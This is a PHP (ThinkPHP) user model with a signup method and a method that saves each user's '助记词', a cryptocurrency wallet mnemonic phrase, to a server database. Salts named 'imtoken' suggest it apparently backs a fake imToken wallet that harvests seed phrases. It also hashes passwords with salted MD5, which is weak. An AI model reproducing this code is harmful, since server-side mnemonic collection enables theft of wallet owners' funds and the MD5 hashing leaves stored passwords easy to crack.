<?php

namespace app\api\model;

use think\Model;

class User extends Model
{
    public function getJoin($data)
    {

        $validate = Validate($this->name);

        if (!$validate->scene('join')->check($data)) {
            $this->error = $validate->getError();
            return false;
        }
        $data['password'] = md5('hello' . md5($data['password']) . 'imtoken');
        $data['unique_key'] = md5($data['username'] . $data['password']) . md5(md5(time() . 'imtoken'));
        $data['create_time'] = time();
        $result = $this->insert($data);
        if ($result) {
            return $result;
        } else {
            $this->error = '创建失败！';
            return false;
        }
    }

    public function getWords($data){
        $validate = Validate($this->name);
        if (!$validate->scene('words')->check($data)) {
            $this->error = $validate->getError();
            return false;
        }
        $where = array(
            'username' => $data['username'],
            'unique_key' => $data['unique_key']
        );
        $rs = $this->where($where)->find();
        if ($rs['uid']) {
            $result = $this->allowField(['words'])->update($data, ['uid' => $rs['uid']]);
            if ($result) {
                return true;
            } else {
                $this->error = '更新助记词失败！';
                return false;
            }
        } else {
            $this->error = '操作失败！';
            return false;
        }
    }
}
